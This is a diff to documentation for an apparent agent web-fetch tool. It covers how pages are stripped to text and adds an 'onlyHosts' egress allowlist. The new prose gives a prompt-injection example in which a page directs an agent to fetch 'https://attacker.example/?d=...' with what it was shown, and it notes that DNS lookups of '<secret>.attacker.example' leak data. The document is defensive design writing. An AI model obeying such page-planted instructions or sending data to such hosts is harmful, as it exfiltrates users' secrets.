@@ -43,12 +43,37 @@ Approval decides *whether*; the address policy decides *where*, and it is
 not the same question. An approver looking at `https://example.com/report`
 has approved that URL — not the redirect it answers with.
 
+## What the text leaves out
+
+Scripts, styles, `svg` and `canvas`, frames, navigation, headers, footers,
+asides, and forms are dropped whole, and block boundaries become line
+breaks. So is what a browser would not show — an element with the
+`hidden` attribute (unless its inline `style` sets `display` again) or an
+inline `style` of `display: none`, `visibility: hidden`, or
+`content-visibility: hidden` — and what it withholds from a screen
+reader, `aria-hidden="true"`. That is to match what a reader of the rendered page
+gets, not a defence against prompt injection: text hidden by a
+stylesheet, a class, or a zero font size still comes through, which is
+why every result is labelled `external`. `raw: true` returns the body as
+received.
+
+Each element is judged where a browser's parser puts it, misnested and
+unclosed markup included, so text moved out of a hidden element is kept
+and text moved into one is not. Two exceptions are deliberate, and both
+keep text a browser would not show: an element still open at the end of
+the page keeps what it holds, so a closing rule this extraction does not
+model cannot erase the article after it; and a hidden `html` or `body`
+hides nothing, because a page that hides its whole document until a
+script runs is showing all of it — hiding everything hides nothing from
+a reader that the page shows anyone else.
+
 ## Settings
 
 | Key | Default | What |
 | --- | --- | --- |
 | `allowedHosts` | none | Hosts exempt from the address check, by name or literal address. The narrow override: one internal service an agent is meant to reach. |
 | `allowPrivateAddresses` | `false` | Reach any non-global address. The trusted-workstation posture — it turns the SSRF protection off rather than adjusting it. |
+| `onlyHosts` | unset (every public host) | The only hosts `web.fetch` may reach, by name or literal address, or `*.example.com` for every subdomain (the apex is its own entry). Every redirect hop is checked against it, and a refused name is never looked up. `allowedHosts` entries stay reachable. Under `agents`, `["*"]` lifts a list the agent would otherwise inherit. |
 | `maxBytes` | `400000` | Stop reading here; the result says `truncated`. A call's own `maxBytes` may ask for less, never more. |
 | `timeoutMs` | `20000` | Give up on the whole exchange — every redirect hop draws on the one budget. |
 | `maxRedirects` | `5` | Hops to follow before refusing. |
@@ -57,6 +82,16 @@ has approved that URL — not the redirect it answers with.
 All of them can be set per agent under `agents`, and `allowedHosts` in
 particular should be: an exemption written once at the top level is an
 exemption every agent gets.
+
+`onlyHosts` is the one setting that narrows rather than widens, and it
+answers a different question from the address check. That check keeps an
+agent's requests off your machine and network; `onlyHosts` keeps what the
+agent has read from leaving it. A page can tell an agent to fetch
+`https://attacker.example/?d=<what you showed it>`, and a URL to any public
+host carries it — so an agent that reads untrusted pages and holds anything
+worth taking should have a list. A name outside it is refused before it is
+looked up, because a DNS query for `<secret>.attacker.example` delivers the
+secret to that zone's nameserver whether or not anything connects.
 
 ## What it refuses, and where
 
